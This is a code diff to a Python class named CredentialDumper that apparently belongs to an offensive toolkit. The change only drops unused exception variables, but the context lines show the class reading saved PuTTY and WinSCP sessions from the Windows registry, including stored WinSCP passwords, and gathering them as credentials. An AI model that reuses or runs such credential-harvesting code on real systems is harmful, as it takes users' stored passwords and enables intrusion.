@@ -270,7 +270,7 @@ class CredentialDumper:
                     try:
                         host = winreg.QueryValueEx(session_key, "HostName")[0]
                         user = winreg.QueryValueEx(session_key, "UserName")[0]
-                    except Exception as exc:
+                    except Exception:
                         logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
                     if host:
@@ -290,7 +290,7 @@ class CredentialDumper:
                     break
 
             winreg.CloseKey(putty_key)
-        except Exception as exc:
+        except Exception:
             logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
         # WinSCP
@@ -312,7 +312,7 @@ class CredentialDumper:
                         host = winreg.QueryValueEx(session_key, "HostName")[0]
                         user = winreg.QueryValueEx(session_key, "UserName")[0]
                         password = winreg.QueryValueEx(session_key, "Password")[0]
-                    except Exception as exc:
+                    except Exception:
                         logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
                     if host:
@@ -333,7 +333,7 @@ class CredentialDumper:
                     break
 
             winreg.CloseKey(winscp_key)
-        except Exception as exc:
+        except Exception:
             logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
         return DumpResult(True, "registry", credentials)
